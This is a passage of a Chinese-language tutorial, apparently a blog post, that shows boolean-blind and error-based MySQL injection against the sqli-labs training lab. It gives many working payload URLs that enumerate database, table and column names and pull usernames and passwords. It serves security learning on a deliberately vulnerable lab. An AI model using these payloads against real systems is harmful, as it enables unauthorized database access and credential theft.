left(database(),1)=&#x27;s&#x27;--+</span></span><br></pre></td></tr></table></figure>\n<p>1.1.1.2.猜解第二个字符</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:必须添加第一个字符,以便进行猜解第二个字符;</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and left(database(),2)=&#x27;se&#x27;--+</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:没有第九个字符,会直接报错,如下面URL.</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and left(database(),9)&gt;&#x27;securitya&#x27;--+</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"1-1-2-爆库\"><a href=\"#1-1-2-爆库\" class=\"headerlink\" title=\"1.1.2.爆库\"></a>1.1.2.爆库</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and left((select schema_name from information_schema.schemata limit</span></span><br><span class=\"line\"><span class=\"string\">0,1),1)=&#x27;i&#x27;--+</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/sqlall/bool2.jpg\" alt=\"bool2\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">其他URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and left((select schema_name from information_schema.schemata limit</span></span><br><span class=\"line\"><span class=\"string\">0,1),12)=&#x27;information_&#x27;--+</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/sqlall/bool3.jpg\" alt=\"bool3\"></p>\n<p>1.1.2.1.第一张表</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and left((select table_name from information_schema.tables where</span></span><br><span class=\"line\"><span class=\"string\">table_schema=&#x27;security&#x27; limit 0,1),1)=&#x27;e&#x27;--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool4.jpg\" alt=\"bool4\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">其他URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and left((select table_name from information_schema.tables where</span></span><br><span class=\"line\"><span class=\"string\">table_schema=&#x27;security&#x27; limit 0,1),3)=‘ema’--+</span></span><br></pre></td></tr></table></figure>\n\n<p>1.1.2.2.第二张表</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and left((select table_name from information_schema.tables where</span></span><br><span class=\"line\"><span class=\"string\">table_schema=&#x27;security&#x27; limit 1,1),1)=&#x27;r&#x27;--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool5.jpg\" alt=\"bool5\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and left((select table_name from information_schema.tables where</span></span><br><span class=\"line\"><span class=\"string\">table_schema=&#x27;security&#x27; limit 1,1),2)=&#x27;re&#x27;--+</span></span><br></pre></td></tr></table></figure>\n\n<p>其他测试可自行继续猜解其他表,其中包含:users等表,具体不作实操;</p>\n<h3 id=\"1-1-3-爆表\"><a href=\"#1-1-3-爆表\" class=\"headerlink\" title=\"1.1.3.爆表\"></a>1.1.3.爆表</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and left((select column_name from information_schema.columns where</span></span><br><span class=\"line\"><span class=\"string\">table_name=&#x27;users&#x27; limit 0,1),1)=&#x27;i&#x27;--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool6.jpg\" alt=\"bool6\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">其他URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and left((select column_name from information_schema.columns where</span></span><br><span class=\"line\"><span class=\"string\">table_name=&#x27;users&#x27; limit 0,1),2)=&#x27;id&#x27;--+</span></span><br></pre></td></tr></table></figure>\n\n<p>其他字段名:id、username、password</p>\n<h3 id=\"1-1-4-爆数据\"><a href=\"#1-1-4-爆数据\" class=\"headerlink\" title=\"1.1.4.爆数据\"></a>1.1.4.爆数据</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:注意:第一个username是D,大写字符,但是这里无法区分大小写;</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and left((select username from security.users limit 0,1),1)=&#x27;d&#x27;--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool7.jpg\" alt=\"bool7\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">其他URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and left((select username from security.users limit 0,1),2)=&#x27;du&#x27;--+</span></span><br></pre></td></tr></table></figure>\n\n<p>建议:这里不要使用此函数进行猜解,因为无法判断字符哪里是大写哪里是小写的字符;建议使用下面ascii码来判断字符信息;其他部分就不继续猜解,因为字符中存在大小写区分.</p>\n<h2 id=\"1-2-ascii-amp-substr\"><a href=\"#1-2-ascii-amp-substr\" class=\"headerlink\" title=\"1.2.ascii()&amp;substr()\"></a>1.2.ascii()&amp;substr()</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">格式:</span><br><span class=\"line\">ascii(string)&gt;ascii码           ascii转换作用,并与外部进行比较;</span><br><span class=\"line\">substr(string,start,length)  从字符串开始的数字,取出长度为length长度的字符;</span><br></pre></td></tr></table></figure>\n\n<p>下面就利用此paylaod进行获取库中表名:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ascii(substr((select table_name from information_schema.tables <span class=\"built_in\">where</span> tables_schema=database() <span class=\"built_in\">limit</span> 0,1),1,1))=101</span><br><span class=\"line\">//注意：database()已经通过以上方式可以获得;</span><br></pre></td></tr></table></figure>\n\n<p>ASCII码对照表:<a href=\"http://ascii.911cha.com/\">http://ascii.911cha.com/</a></p>\n<h3 id=\"1-2-1-爆库\"><a href=\"#1-2-1-爆库\" class=\"headerlink\" title=\"1.2.1.爆库\"></a>1.2.1.爆库</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and ascii(substr((select database()),1,1))=115 --+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool8.jpg\" alt=\"bool8\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">其他URL:101—&gt;<span class=\"string\">&#x27;e&#x27;</span></span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and ascii(substr((select database()),2,1))=101 --+</span></span><br></pre></td></tr></table></figure>\n\n<p>注意:超出字符长度时,设置最小ascii字符,也会报错,说明字符已经猜解完毕</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and ascii(substr((select database()),9,1))&gt;65 --+</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"1-2-2-爆表\"><a href=\"#1-2-2-爆表\" class=\"headerlink\" title=\"1.2.2.爆表\"></a>1.2.2.爆表</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:101—&gt;<span class=\"string\">&#x27;e&#x27;</span></span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and ascii(substr((select table_name from information_schema.tables where</span></span><br><span class=\"line\"><span class=\"string\">table_schema=&#x27;security&#x27; limit 0,1),1,1))=101 --+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool9.jpg\" alt=\"bool9\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">其他URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and ascii(substr((select table_name from information_schema.tables where</span></span><br><span class=\"line\"><span class=\"string\">table_schema=&#x27;security&#x27; limit 0,1),2,1))=109 --+</span></span><br></pre></td></tr></table></figure>\n\n<p>和上面一样修改部分数字即可;表名:users、emails等:</p>\n<h3 id=\"1-2-3-爆字段\"><a href=\"#1-2-3-爆字段\" class=\"headerlink\" title=\"1.2.3.爆字段\"></a>1.2.3.爆字段</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and ascii(substr((select column_name from information_schema.columns where</span></span><br><span class=\"line\"><span class=\"string\">table_name=&#x27;users&#x27; limit 0,1),1,1))=105 --+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool10.jpg\" alt=\"bool10\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">其他URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and ascii(substr((select column_name from information_schema.columns where</span></span><br><span class=\"line\"><span class=\"string\">table_name=&#x27;users&#x27; limit 0,1),2,1))=100 --+</span></span><br></pre></td></tr></table></figure>\n\n<p>其他部分不作测试,列名:id、admin、username、password等,我们主要以username和password两列为主;</p>\n<h2 id=\"1-3-ord-amp-mid\"><a href=\"#1-3-ord-amp-mid\" class=\"headerlink\" title=\"1.3.ord()&amp;mid()\"></a>1.3.ord()&amp;mid()</h2><p>通过以上布尔型盲注后可以获取数据库、表和字段名等信息;其实ord和mid函数的作用和上面我们说的ascii和substr函数一致.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">格式:</span><br><span class=\"line\">ord(string)     对获取的字符进行ascii码转换;</span><br><span class=\"line\">mid((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1)    截取字段中第一行的第一个字符;</span><br><span class=\"line\">mid(column_name,start[,length])</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"1-3-1-爆库\"><a href=\"#1-3-1-爆库\" class=\"headerlink\" title=\"1.3.1.爆库\"></a>1.3.1.爆库</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:第一个字符的ASCII码</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and ord(mid((select database()),1,1))=115--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool12.jpg\" alt=\"bool12\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">其他URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and ord(mid((select database()),2,1))=101--+</span></span><br></pre></td></tr></table></figure>\n\n<p>后续的注入语句可以参考上面.</p>\n<h2 id=\"1-4-regexp正则\"><a href=\"#1-4-regexp正则\" class=\"headerlink\" title=\"1.4.regexp正则\"></a>1.4.regexp正则</h2><p>通过上面方法我们已经获取数据库和表,此时就是获取字段信息;而,正则表达式法,主要是利用布尔型进行模糊匹配.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">格式:regexp <span class=\"string\">&#x27;^…&#x27;</span></span><br><span class=\"line\">regexp ‘^…<span class=\"string\">&#x27;  and 1=(select 1 from information_schema.columns where table_name=&#x27;</span>users<span class=\"string\">&#x27; and column_name regexp &#x27;</span>^us[a-z]<span class=\"string\">&#x27; limit 0,1)</span></span><br><span class=\"line\"><span class=\"string\">--+</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"1-4-1-爆库\"><a href=\"#1-4-1-爆库\" class=\"headerlink\" title=\"1.4.1.爆库\"></a>1.4.1.爆库</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and 1=(select 1 and database() regexp &#x27;^[a-z]&#x27; limit 0,1) --+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool13.jpg\" alt=\"bool13\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">其他URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and 1=(select 1 and database() regexp &#x27;^[s-s]&#x27; limit 0,1) --+</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"1-4-2-爆表\"><a href=\"#1-4-2-爆表\" class=\"headerlink\" title=\"1.4.2.爆表\"></a>1.4.2.爆表</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and 1=(select 1 from information_schema.tables where table_schema=&#x27;security&#x27; and</span></span><br><span class=\"line\"><span class=\"string\">table_name regexp &#x27;^[a-s]&#x27; limit 0,1) --+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool14.jpg\" alt=\"bool14\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">其他URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and 1=(select 1 from information_schema.tables where table_schema=&#x27;security&#x27; and</span></span><br><span class=\"line\"><span class=\"string\">table_name regexp &#x27;^[e-e]&#x27; limit 0,1) --+</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"1-4-3-爆字段\"><a href=\"#1-4-3-爆字段\" class=\"headerlink\" title=\"1.4.3.爆字段\"></a>1.4.3.爆字段</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and 1=(select 1 from information_schema.columns where table_name=&#x27;users&#x27; and</span></span><br><span class=\"line\"><span class=\"string\">column_name regexp &#x27;^[a-z]&#x27; limit 0,1) --+</span></span><br></pre></td></tr></table></figure>\n\n<p>其他部分请自行继续.</p>\n<h1 id=\"二、报错注入\"><a href=\"#二、报错注入\" class=\"headerlink\" title=\"二、报错注入\"></a>二、报错注入</h1><h2 id=\"2-1-count-amp-floor-amp-group-by\"><a href=\"#2-1-count-amp-floor-amp-group-by\" class=\"headerlink\" title=\"2.1.count&amp;floor&amp;group by\"></a>2.1.count&amp;floor&amp;group by</h2><p>count(*)、floor(rand(0)*2)和group by的报错原理已经进行分析,可以参考后续:《Mysql注入之报错注入学习与分析-&gt;floor、count、group by》具体的语句构造可以参考下面的方式进行..这里省略了注入判断部分.</p>\n<h3 id=\"2-1-0-数据库\"><a href=\"#2-1-0-数据库\" class=\"headerlink\" title=\"2.1.0.数据库\"></a>2.1.0.数据库</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select 1,count(*),concat(0x3a,(select user()),0x3a,floor(rand(0)*2))a from</span></span><br><span class=\"line\"><span class=\"string\">information_schema.columns group by a --+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool15.jpg\" alt=\"bool15\"></p>\n<h3 id=\"2-1-1-爆库\"><a href=\"#2-1-1-爆库\" class=\"headerlink\" title=\"2.1.1.爆库\"></a>2.1.1.爆库</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select 1,count(*),concat(0x3a,(select schema_name from </span></span><br><span class=\"line\"><span class=\"string\">information_schema.schemata limit 0,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool16.jpg\" alt=\"bool16\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">其他URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select 1,count(*),concat(0x3a,(select schema_name from</span></span><br><span class=\"line\"><span class=\"string\">information_schema.schemata limit 6,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-1-2-爆表\"><a href=\"#2-1-2-爆表\" class=\"headerlink\" title=\"2.1.2.爆表\"></a>2.1.2.爆表</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select 1,count(*),concat(0x3a,(select table_name from</span></span><br><span class=\"line\"><span class=\"string\">information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),0x3a,floor(rand(0)*2))a from</span></span><br><span class=\"line\"><span class=\"string\">information_schema.columns group by a --+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool17.jpg\" alt=\"bool17\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">其他URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select 1,count(*),concat(0x3a,(select table_name from</span></span><br><span class=\"line\"><span class=\"string\">information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),0x3a,floor(rand(0)*2))a from</span></span><br><span class=\"line\"><span class=\"string\">information_schema.columns group by a --+</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-1-3-爆字段\"><a href=\"#2-1-3-爆字段\" class=\"headerlink\" title=\"2.1.3.爆字段\"></a>2.1.3.爆字段</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select 1,count(*),concat(0x3a,(select column_name from</span></span><br><span class=\"line\"><span class=\"string\">information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x3a,floor(rand(0)*2))a from information_schema.columns</span></span><br><span class=\"line\"><span class=\"string\">group by a --+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool18.jpg\" alt=\"bool18\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">其他URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select 1,count(*),concat(0x3a,(select column_name from</span></span><br><span class=\"line\"><span class=\"string\">information_schema.columns where table_name=&#x27;users&#x27; limit 2,1),0x3a,floor(rand(0)*2))a from information_schema.columns</span></span><br><span class=\"line\"><span class=\"string\">group by a --+</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-1-4-爆数据\"><a href=\"#2-1-4-爆数据\" class=\"headerlink\" title=\"2.1.4.爆数据\"></a>2.1.4.爆数据</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:这里payload只能爆出一列字段信息</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select 1,scount(*),concat(0x3a,(select username from security.users limit</span></span><br><span class=\"line\"><span class=\"string\">0,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool19.jpg\" alt=\"bool19\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">其他URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select 1,count(*),concat(0x3a,(select password from security.users limit</span></span><br><span class=\"line\"><span class=\"string\">0,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"2-2-EXP-报错\"><a href=\"#2-2-EXP-报错\" class=\"headerlink\" title=\"2.2.EXP()报错\"></a>2.2.EXP()报错</h2><p>EXP(x) 返回值e（自然对数的底）的x次方;如果不懂的,可以看这篇文章:《Mysql注入之exp报错注入》</p>\n<p>URL：备注：使用EXP函数进行报错时，必须得知列长，如：这里是id、username、password三列</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://sqli-labs.me:8888/Less-5/?id=1<span class=\"string\">&#x27; union select (exp(~(select * FROM(SELECT USER())a))),2,3--+\t</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool21.jpg\" alt=\"bool21\"></p>\n<p>如果列数量不对时会报错;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-5/?id=1<span class=\"string\">&#x27; union select (exp(~(select * FROM(SELECT USER())a))),3--+</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-2-1-爆库\"><a href=\"#2-2-1-爆库\" class=\"headerlink\" title=\"2.2.1.爆库\"></a>2.2.1.爆库</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">第一个数据库:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-5/?id=1<span class=\"string\">&#x27; union select (exp(~(select * FROM(SELECT schema_name from</span></span><br><span class=\"line\"><span class=\"string\">information_schema.schemata limit 0,1)a))),2,3--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool23.jpg\" alt=\"bool23\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">第二个数据库:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-5/?id=1<span class=\"string\">&#x27; union select (exp(~(select * FROM(SELECT schema_name from</span></span><br><span class=\"line\"><span class=\"string\">information_schema.schemata limit 1,1)a))),2,3--+</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-2-2-爆表\"><a href=\"#2-2-2-爆表\" class=\"headerlink\" title=\"2.2.2.爆表\"></a>2.2.2.爆表</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">第一张表:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-5/?id=1<span class=\"string\">&#x27; union select (exp(~(select * FROM(SELECT table_name from</span></span><br><span class=\"line\"><span class=\"string\">information_schema.tables where table_schema=&#x27;</span>security<span class=\"string\">&#x27; limit 0,1)a))),2,3--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool24.jpg\" alt=\"bool24\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">第三张表:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-5/?id=1<span class=\"string\">&#x27; union select (exp(~(select * FROM(SELECT table_name from</span></span><br><span class=\"line\"><span class=\"string\">information_schema.tables where table_schema=&#x27;</span>security<span class=\"string\">&#x27; limit 2,1)a))),2,3--+</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-2-3-爆字段\"><a href=\"#2-2-3-爆字段\" class=\"headerlink\" title=\"2.2.3.爆字段\"></a>2.2.3.爆字段</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">第一个字段名:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-5/?id=1<span class=\"string\">&#x27; union select (exp(~(select * FROM(SELECT column_name from</span></span><br><span class=\"line\"><span class=\"string\">information_schema.columns where table_name=&#x27;</span>users<span class=\"string\">&#x27; limit 0,1)a))),2,3--+</span></span><br></pre></td></tr></table></figure>\n\n<h3 